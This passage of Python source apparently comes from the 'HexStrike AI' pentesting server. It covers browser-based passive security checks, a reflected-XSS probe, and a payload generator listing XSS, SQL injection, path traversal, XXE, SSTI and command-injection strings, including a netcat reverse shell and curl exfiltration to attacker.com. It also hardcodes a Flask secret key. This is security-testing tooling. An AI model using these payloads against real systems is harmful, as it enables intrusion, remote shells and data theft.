    def _analyze_security_headers(self, page_source: str, page_info: dict) -> list:
        # We cannot directly read response headers via Selenium; attempt a lightweight fetch with requests
        issues = []
        try:
            resp = requests.get(page_info.get('url',''), timeout=10, verify=False)
            headers = {k.lower():v for k,v in resp.headers.items()}
            required = {
                'content-security-policy':'CSP header missing (XSS mitigation)',
                'x-frame-options':'X-Frame-Options missing (Clickjacking risk)',
                'x-content-type-options':'X-Content-Type-Options missing (MIME sniffing risk)',
                'referrer-policy':'Referrer-Policy missing (leaky referrers)',
                'strict-transport-security':'HSTS missing (HTTPS downgrade risk)'
            }
            for key, desc in required.items():
                if key not in headers:
                    issues.append({'type':'missing_security_header','severity':'medium','description':desc,'header':key})
            # Weak CSP heuristic
            csp = headers.get('content-security-policy','')
            if csp and "unsafe-inline" in csp:
                issues.append({'type':'weak_csp','severity':'low','description':'CSP allows unsafe-inline scripts'})
        except Exception:
            pass
        return issues

    def _detect_mixed_content(self, page_info: dict) -> list:
        issues = []
        try:
            page_url = page_info.get('url','')
            if page_url.startswith('https://'):
                for req in page_info.get('network_requests', [])[:200]:
                    u = req.get('url','')
                    if u.startswith('http://'):
                        issues.append({'type':'mixed_content','severity':'medium','description':f'HTTP resource loaded over HTTPS page: {u[:100]}'})
        except Exception:
            pass
        return issues

    def _extended_passive_analysis(self, page_info: dict, page_source: str) -> dict:
        modules = []
        issues = []
        # Cookies
        cookie_issues = self._analyze_cookies(page_info.get('cookies', []))
        if cookie_issues:
            issues.extend(cookie_issues); modules.append('cookie_analysis')
        # Headers
        header_issues = self._analyze_security_headers(page_source, page_info)
        if header_issues:
            issues.extend(header_issues); modules.append('security_headers')
        # Mixed content
        mixed = self._detect_mixed_content(page_info)
        if mixed:
            issues.extend(mixed); modules.append('mixed_content')
        # Console errors may hint at DOM XSS sinks
        if page_info.get('console_errors'):
            modules.append('console_log_capture')
        return {'issues': issues, 'modules': modules}

    def run_active_tests(self, page_info: dict, payload: str = '<hexstrikeXSSTest123>') -> dict:
        """Very lightweight active tests (reflection check) - safe mode.
        Only GET forms with text inputs to avoid state-changing operations."""
        findings = []
        tested = 0
        for form in page_info.get('forms', []):
            if form.get('method','GET').upper() != 'GET':
                continue
            params = []
            for inp in form.get('inputs', [])[:3]:  # limit
                if inp.get('type','text') in ('text','search'):
                    params.append(f"{inp.get('name','param')}={payload}")
            if not params:
                continue
            action = form.get('action') or page_info.get('url','')
            if action.startswith('/'):
                # relative
                base = page_info.get('url','')
                try:
                    from urllib.parse import urljoin
                    action = urljoin(base, action)
                except Exception:
                    pass
            test_url = action + ('&' if '?' in action else '?') + '&'.join(params)
            try:
                r = requests.get(test_url, timeout=8, verify=False)
                tested += 1
                if payload in r.text:
                    findings.append({'type':'reflected_xss','severity':'high','description':'Payload reflected in response','url':test_url})
            except Exception:
                continue
            if tested >= 5:
                break
        return {'active_findings': findings, 'tested_forms': tested}

    def _get_local_storage(self) -> dict:
        """Extract local storage data"""
        try:
            return self.driver.execute_script("""
                var storage = {};
                for (var i = 0; i < localStorage.length; i++) {
                    var key = localStorage.key(i);
                    storage[key] = localStorage.getItem(key);
                }
                return storage;
            """)
        except:
            return {}
    
    def _get_session_storage(self) -> dict:
        """Extract session storage data"""
        try:
            return self.driver.execute_script("""
                var storage = {};
                for (var i = 0; i < sessionStorage.length; i++) {
                    var key = sessionStorage.key(i);
                    storage[key] = sessionStorage.getItem(key);
                }
                return storage;
            """)
        except:
            return {}
    
    def _extract_forms(self) -> list:
        """Extract all forms from the page"""
        forms = []
        try:
            form_elements = self.driver.find_elements(By.TAG_NAME, 'form')
            for form in form_elements:
                form_data = {
                    'action': form.get_attribute('action') or '',
                    'method': form.get_attribute('method') or 'GET',
                    'inputs': []
                }
                
                inputs = form.find_elements(By.TAG_NAME, 'input')
                for input_elem in inputs:
                    form_data['inputs'].append({
                        'name': input_elem.get_attribute('name') or '',
                        'type': input_elem.get_attribute('type') or 'text',
                        'value': input_elem.get_attribute('value') or ''
                    })
                
                forms.append(form_data)
        except:
            pass
        
        return forms
    
    def _extract_links(self) -> list:
        """Extract all links from the page"""
        links = []
        try:
            link_elements = self.driver.find_elements(By.TAG_NAME, 'a')
            for link in link_elements[:50]:  # Limit to 50 links
                href = link.get_attribute('href')
                if href:
                    links.append({
                        'href': href,
                        'text': link.text[:100]  # Limit text length
                    })
        except:
            pass
        
        return links
    
    def _extract_inputs(self) -> list:
        """Extract all input elements"""
        inputs = []
        try:
            input_elements = self.driver.find_elements(By.TAG_NAME, 'input')
            for input_elem in input_elements:
                inputs.append({
                    'name': input_elem.get_attribute('name') or '',
                    'type': input_elem.get_attribute('type') or 'text',
                    'id': input_elem.get_attribute('id') or '',
                    'placeholder': input_elem.get_attribute('placeholder') or ''
                })
        except:
            pass
        
        return inputs
    
    def _extract_scripts(self) -> list:
        """Extract script sources and inline scripts"""
        scripts = []
        try:
            script_elements = self.driver.find_elements(By.TAG_NAME, 'script')
            for script in script_elements[:20]:  # Limit to 20 scripts
                src = script.get_attribute('src')
                if src:
                    scripts.append({'type': 'external', 'src': src})
                else:
                    content = script.get_attribute('innerHTML')
                    if content and len(content) > 10:
                        scripts.append({
                            'type': 'inline',
                            'content': content[:1000]  # Limit content
                        })
        except:
            pass
        
        return scripts
    
    def _get_network_logs(self) -> list:
        """Get network request logs"""
        try:
            logs = self.driver.get_log('performance')
            network_requests = []
            
            for log in logs[-50:]:  # Last 50 logs
                message = json.loads(log['message'])
                if message['message']['method'] == 'Network.responseReceived':
                    response = message['message']['params']['response']
                    network_requests.append({
                        'url': response['url'],
                        'status': response['status'],
                        'mimeType': response['mimeType'],
                        'headers': response.get('headers', {})
                    })
            
            return network_requests
        except:
            return []
    
    def _analyze_page_security(self, page_source: str, page_info: dict) -> dict:
        """Analyze page for security vulnerabilities"""
        issues = []
        
        # Check for sensitive data in local/session storage
        for storage_type, storage_data in [('localStorage', page_info.get('local_storage', {})),
                                          ('sessionStorage', page_info.get('session_storage', {}))]:
            for key, value in storage_data.items():
                if any(sensitive in key.lower() for sensitive in ['password', 'token', 'secret', 'key']):
                    issues.append({
                        'type': 'sensitive_data_storage',
                        'severity': 'high',
                        'description': f'Sensitive data found in {storage_type}: {key}',
                        'location': storage_type
                    })
        
        # Check for forms without CSRF protection
        for form in page_info.get('forms', []):
            has_csrf = any('csrf' in input_data['name'].lower() or 'token' in input_data['name'].lower() 
                          for input_data in form['inputs'])
            if not has_csrf and form['method'].upper() == 'POST':
                issues.append({
                    'type': 'missing_csrf_protection',
                    'severity': 'medium',
                    'description': 'Form without CSRF protection detected',
                    'form_action': form['action']
                })
        
        # Check for inline JavaScript
        inline_scripts = [s for s in page_info.get('scripts', []) if s['type'] == 'inline']
        if inline_scripts:
            issues.append({
                'type': 'inline_javascript',
                'severity': 'low',
                'description': f'Found {len(inline_scripts)} inline JavaScript blocks',
                'count': len(inline_scripts)
            })
        
        return {
            'total_issues': len(issues),
            'issues': issues,
            'security_score': max(0, 100 - (len(issues) * 10))  # Simple scoring
        }
    
    def close_browser(self):
        """Close the browser instance"""
        if self.driver:
            self.driver.quit()
            self.driver = None
            logger.info(f"{ModernVisualEngine.format_tool_status('BrowserAgent', 'SUCCESS', 'Browser Closed')}")

# Global instances
http_framework = HTTPTestingFramework()
browser_agent = BrowserAgent()









# ============================================================================
# AI-POWERED PAYLOAD GENERATION (v5.0 ENHANCEMENT) UNDER DEVELOPMENT
# ============================================================================

class AIPayloadGenerator:
    """AI-powered payload generation system with contextual intelligence"""
    
    def __init__(self):
        self.payload_templates = {
            "xss": {
                "basic": ["<script>alert('XSS')</script>", "javascript:alert('XSS')", "'><script>alert('XSS')</script>"],
                "advanced": [
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>",
                    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
                    "\"><script>alert('XSS')</script><!--",
                    "<iframe src=\"javascript:alert('XSS')\">",
                    "<body onload=alert('XSS')>"
                ],
                "bypass": [
                    "<ScRiPt>alert('XSS')</ScRiPt>",
                    "<script>alert(String.fromCharCode(88,83,83))</script>",
                    "<img src=\"javascript:alert('XSS')\">",
                    "<svg/onload=alert('XSS')>",
                    "javascript:alert('XSS')",
                    "<details ontoggle=alert('XSS')>"
                ]
            },
            "sqli": {
                "basic": ["' OR '1'='1", "' OR 1=1--", "admin'--", "' UNION SELECT NULL--"],
                "advanced": [
                    "' UNION SELECT 1,2,3,4,5--",
                    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                    "' AND (SELECT SUBSTRING(@@version,1,10))='Microsoft'--",
                    "'; EXEC xp_cmdshell('whoami')--",
                    "' OR 1=1 LIMIT 1--",
                    "' AND 1=(SELECT COUNT(*) FROM tablenames)--"
                ],
                "time_based": [
                    "'; WAITFOR DELAY '00:00:05'--",
                    "' OR (SELECT SLEEP(5))--",
                    "'; SELECT pg_sleep(5)--",
                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
                ]
            },
            "lfi": {
                "basic": ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"],
                "advanced": [
                    "....//....//....//etc/passwd",
                    "..%2F..%2F..%2Fetc%2Fpasswd",
                    "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
                    "/var/log/apache2/access.log",
                    "/proc/self/environ",
                    "/etc/passwd%00"
                ]
            },
            "cmd_injection": {
                "basic": ["; whoami", "| whoami", "& whoami", "`whoami`"],
                "advanced": [
                    "; cat /etc/passwd",
                    "| nc -e /bin/bash attacker.com 4444",
                    "&& curl http://attacker.com/$(whoami)",
                    "`curl http://attacker.com/$(id)`"
                ]
            },
            "xxe": {
                "basic": [
                    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><foo>&xxe;</foo>"
                ]
            },
            "ssti": {
                "basic": ["{{7*7}}", "${7*7}", "#{7*7}", "<%=7*7%>"],
                "advanced": [
                    "{{config}}",
                    "{{''.__class__.__mro__[2].__subclasses__()}}",
                    "{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}"
                ]
            }
        }
    
    def generate_contextual_payload(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate contextual payloads based on target information"""
        
        attack_type = target_info.get("attack_type", "xss")
        complexity = target_info.get("complexity", "basic")
        target_tech = target_info.get("technology", "").lower()
        
        # Get base payloads
        payloads = self._get_payloads(attack_type, complexity)
        
        # Enhance payloads with context
        enhanced_payloads = self._enhance_with_context(payloads, target_tech)
        
        # Generate test cases
        test_cases = self._generate_test_cases(enhanced_payloads, attack_type)
        
        return {
            "attack_type": attack_type,
            "complexity": complexity,
            "payload_count": len(enhanced_payloads),
            "payloads": enhanced_payloads,
            "test_cases": test_cases,
            "recommendations": self._get_recommendations(attack_type)
        }
    
    def _get_payloads(self, attack_type: str, complexity: str) -> list:
        """Get payloads for specific attack type and complexity"""
        if attack_type in self.payload_templates:
            if complexity in self.payload_templates[attack_type]:
                return self.payload_templates[attack_type][complexity]
            else:
                # Return basic payloads if complexity not found
                return self.payload_templates[attack_type].get("basic", [])
        
        return ["<!-- No payloads available for this attack type -->"]
    
    def _enhance_with_context(self, payloads: list, tech_context: str) -> list:
        """Enhance payloads with contextual information"""
        enhanced = []
        
        for payload in payloads:
            # Basic payload
            enhanced.append({
                "payload": payload,
                "context": "basic",
                "encoding": "none",
                "risk_level": self._assess_risk_level(payload)
            })
            
            # URL encoded version
            url_encoded = payload.replace(" ", "%20").replace("<", "%3C").replace(">", "%3E")
            enhanced.append({
                "payload": url_encoded,
                "context": "url_encoded",
                "encoding": "url",
                "risk_level": self._assess_risk_level(payload)
            })
        
        return enhanced
    
    def _generate_test_cases(self, payloads: list, attack_type: str) -> list:
        """Generate test cases for the payloads"""
        test_cases = []
        
        for i, payload_info in enumerate(payloads[:5]):  # Limit to 5 test cases
            test_case = {
                "id": f"test_{i+1}",
                "payload": payload_info["payload"],
                "method": "GET" if len(payload_info["payload"]) < 100 else "POST",
                "expected_behavior": self._get_expected_behavior(attack_type),
                "risk_level": payload_info["risk_level"]
            }
            test_cases.append(test_case)
        
        return test_cases
    
    def _get_expected_behavior(self, attack_type: str) -> str:
        """Get expected behavior for attack type"""
        behaviors = {
            "xss": "JavaScript execution or popup alert",
            "sqli": "Database error or data extraction",
            "lfi": "File content disclosure",
            "cmd_injection": "Command execution on server",
            "ssti": "Template expression evaluation",
            "xxe": "XML external entity processing"
        }
        return behaviors.get(attack_type, "Unexpected application behavior")
    
    def _assess_risk_level(self, payload: str) -> str:
        """Assess risk level of payload"""
        high_risk_indicators = ["system", "exec", "eval", "cmd", "shell", "passwd", "etc"]
        medium_risk_indicators = ["script", "alert", "union", "select"]
        
        payload_lower = payload.lower()
        
        if any(indicator in payload_lower for indicator in high_risk_indicators):
            return "HIGH"
        elif any(indicator in payload_lower for indicator in medium_risk_indicators):
            return "MEDIUM"
        else:
            return "LOW"
    
    def _get_recommendations(self, attack_type: str) -> list:
        """Get testing recommendations"""
        recommendations = {
            "xss": [
                "Test in different input fields and parameters",
                "Try both reflected and stored XSS scenarios",
                "Test with different browsers for compatibility"
            ],
            "sqli": [
                "Test different SQL injection techniques",
                "Try both error-based and blind injection",
                "Test various database-specific payloads"
            ],
            "lfi": [
                "Test various directory traversal depths",
                "Try different encoding techniques",
                "Test for log file inclusion"
            ],
            "cmd_injection": [
                "Test different command separators",
                "Try both direct and blind injection",
                "Test with various payloads for different OS"
            ]
        }
        
        return recommendations.get(attack_type, ["Test thoroughly", "Monitor responses"])

# Global AI payload generator
ai_payload_generator = AIPayloadGenerator()


# ============================================================================
# ADVANCED API TESTING TOOLS (v5.0 ENHANCEMENT)
# ============================================================================




# ============================================================================
# ADVANCED CTF TOOLS (v5.0 ENHANCEMENT)
# ============================================================================






# ============================================================================
# BUG BOUNTY RECONNAISSANCE TOOLS (v5.0 ENHANCEMENT)
# ============================================================================


# ============================================================================
# ADVANCED VULNERABILITY INTELLIGENCE API ENDPOINTS (v6.0 ENHANCEMENT)
# ============================================================================







# ============================================================================
# CTF COMPETITION EXCELLENCE FRAMEWORK API ENDPOINTS (v8.0 ENHANCEMENT)
# ============================================================================








# ============================================================================
# ADVANCED PROCESS MANAGEMENT API ENDPOINTS (v10.0 ENHANCEMENT)
# ============================================================================




# ============================================================================
# BANNER AND STARTUP CONFIGURATION
# ============================================================================


# Create the banner after all classes are defined
BANNER = ModernVisualEngine.create_banner()

if __name__ == "__main__":
    # Display the beautiful new banner
    print(BANNER)
    
    parser = argparse.ArgumentParser(description="Run the HexStrike AI API Server")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode")
    parser.add_argument("--port", type=int, default=API_PORT, help=f"Port for the API server (default: {API_PORT})")
    parser.add_argument("--modular", action="store_true", help="Use modular architecture")
    args = parser.parse_args()
    
    if args.debug:
        DEBUG_MODE = True
        logger.setLevel(logging.DEBUG)
    
    if args.port != API_PORT:
        API_PORT = args.port
    
    if args.modular:
        MODULAR_MODE = True
    
    # Enhanced startup messages with beautiful formatting
    startup_info = f"""
{ModernVisualEngine.COLORS['MATRIX_GREEN']}{ModernVisualEngine.COLORS['BOLD']}╭─────────────────────────────────────────────────────────────────────────────╮{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['NEON_BLUE']}🚀 Starting HexStrike AI Tools API Server{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}├─────────────────────────────────────────────────────────────────────────────┤{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['CYBER_ORANGE']}🌐 Port:{ModernVisualEngine.COLORS['RESET']} {API_PORT}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['WARNING']}🔧 Debug Mode:{ModernVisualEngine.COLORS['RESET']} {DEBUG_MODE}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['ELECTRIC_PURPLE']}🏗️  Modular Mode:{ModernVisualEngine.COLORS['RESET']} {MODULAR_MODE}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['ELECTRIC_PURPLE']}💾 Cache Size:{ModernVisualEngine.COLORS['RESET']} {CACHE_SIZE} | TTL: {CACHE_TTL}s
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['TERMINAL_GRAY']}⏱️  Command Timeout:{ModernVisualEngine.COLORS['RESET']} {COMMAND_TIMEOUT}s
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['MATRIX_GREEN']}✨ Enhanced Visual Engine:{ModernVisualEngine.COLORS['RESET']} Active
{ModernVisualEngine.COLORS['MATRIX_GREEN']}{ModernVisualEngine.COLORS['BOLD']}╰─────────────────────────────────────────────────────────────────────────────╯{ModernVisualEngine.COLORS['RESET']}
"""
    
    for line in startup_info.strip().split('\n'):
        if line.strip():
            logger.info(line)
    
    # ============================================================================
    # ============================================================================

    if MODULAR_MODE:
        logger.info("🏗️  Initializing modular architecture...")
        
        try:
            # Import and initialize FlaskAdapter
            from src.hexstrike.adapters.flask_adapter import FlaskAdapter
            
            # Create new Flask app for modular mode
            modular_app = Flask(__name__)
            modular_app.config['SECRET_KEY'] = 'hexstrike-ai-secret-key'
            
            # Initialize FlaskAdapter with the new app
            flask_adapter = FlaskAdapter(modular_app)
            flask_adapter.register_routes()
            
            logger.info("✅ Modular architecture initialized successfully")
            logger.info("🔗 All endpoints registered via FlaskAdapter")
            
            # Start modular Flask application
            modular_app.run(host=API_HOST, port=API_PORT, debug=DEBUG_MODE)
            
        except ImportError as e:
            logger.error(f"❌ Failed to initialize modular architecture: {e}")
            logger.info("🔄 Falling back to monolithic mode...")
            MODULAR_MODE = False
        except Exception as e:
            logger.error(f"❌ Error in modular initialization: {e}")
            logger.info("🔄 Falling back to monolithic mode...")
            MODULAR_MODE = False
    
    if not MODULAR_MODE:
        logger.info("🏛️  Running in monolithic mode...")
        
        # Import compatibility shims for backward compatibility
        try:
            from hexstrike.legacy.compatibility_shims import (
                IntelligentDecisionEngine,
                ModernVisualEngine,
                IntelligentErrorHandler,
                ProcessManager,
                execute_command,
                execute_command_with_recovery,
                decision_engine as compat_decision_engine,
                error_handler as compat_error_handler,
                visual_engine as compat_visual_engine,
                process_manager as compat_process_manager
            )
            
            decision_engine = compat_decision_engine
            error_handler = compat_error_handler
            visual_engine = compat_visual_engine
            process_manager = compat_process_manager
            
            logger.info("✅ Backward compatibility layer loaded successfully")
            
        except ImportError as e:
            logger.warning(f"⚠️ Compatibility layer not available: {e}")
        
        # Start the monolithic Flask application
        app.run(host=API_HOST, port=API_PORT, debug=DEBUG_MODE)
